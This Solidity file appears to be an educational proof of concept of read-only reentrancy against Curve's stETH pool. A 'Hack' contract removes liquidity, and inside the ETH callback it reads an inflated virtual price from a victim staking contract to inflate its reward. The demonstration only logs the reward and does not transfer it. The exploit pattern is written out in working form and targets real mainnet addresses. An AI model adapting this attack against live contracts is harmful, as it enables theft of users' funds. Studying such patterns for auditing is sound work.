// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./interfaces/ICurve.sol";
import "forge-std/Console.sol";

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E;

contract Target {
    IERC20 public constant token = IERC20(LP);
    ICurve private constant pool = ICurve(STETH_POOL);

    mapping(address => uint256) public balanceOf;

    function stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function unstake(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    function getReward() external view returns (uint256) {
        uint256 reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1e18;
        // Omitting code to transfer reward tokens
        return reward;
    }
}

contract Hack {
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP);
    Target private immutable target;

    constructor(address _target) {
        target = Target(_target);
    }

    receive() external payable {
        console.log(
            "during remove LP - virtual price",
            pool.get_virtual_price()
        );
        // Attack - Log reward amount
        uint256 reward = target.getReward();
        console.log("reward", reward);
    }

    // Deposit into target
    function setup() external payable {
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);

        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    function pwn() external payable {
        // Add liquidity
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "before remove LP - virtual price",
            pool.get_virtual_price()
        );
        // console.log("lp", lp);

        // remove liquidity
        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        pool.remove_liquidity(lp, min_amounts);

        // Log get_virtual_price
        console.log(
            "after remove LP - virtual price",
            pool.get_virtual_price()
        );

        // Attack - Log reward amount
        uint256 reward = target.getReward();
        console.log("reward", reward);
    }
}
